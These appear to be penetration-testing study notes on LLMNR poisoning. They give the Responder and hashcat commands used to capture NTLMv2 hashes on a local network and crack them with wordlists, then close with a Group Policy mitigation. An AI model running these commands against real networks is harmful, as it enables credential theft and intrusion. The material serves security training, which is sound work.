## LLMNR poisoning overview

Protocol Used to identift hist when DNS resolution is impossible.
We can intercept traffic in a network containing username and hash

sudo responder -I eth0 -dwP

## Capturing hashes with Responder

sudo responder -I eth0 -dwP
-d answer for DHCP broadcast request
-w wpad rogue proxy server. It allows browser to automatically detect proxy
-P force authentication for the proxy

From target machine we try to reach attacker from file explorer \\192.168.138.134
We get ntml hash

## Cracking our captured hash

Copy full hash, paste it in a file to crack it using hashcat.
If hash is unknown use 'hash-identifieer'

hashcat --help | grep ntlm

hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --show to only show cracked password

hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --force to force hashcat

hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r OneRule to mutate the used password from our wordlist

## LLMNR poisoning mitigation

Group Policy Management > Computer configuration > Policies > Administrative Template > Network > Dns CLient> Turn off multicast name resolution

We can require to have LLMNR but add permission settings, based on MAC address as example, or require complex password policy